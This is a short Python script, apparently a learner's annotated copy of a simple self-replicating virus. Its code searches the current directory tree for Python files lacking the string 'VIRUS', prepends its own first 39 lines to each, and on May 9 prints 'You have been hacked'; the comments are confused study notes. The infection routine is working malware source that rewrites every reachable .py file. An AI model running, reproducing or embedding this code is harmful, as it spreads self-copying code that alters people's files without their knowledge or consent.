#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

# function? its given a path or it's given a variable named path?
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    # cehcks all uninfected files in the folder and infects them, then checks again
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

  # function that infects the given folder
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

        # cant find what detonate means yet but it blows something up in a computer manner by the nam of it
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

        # functions called upon?
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
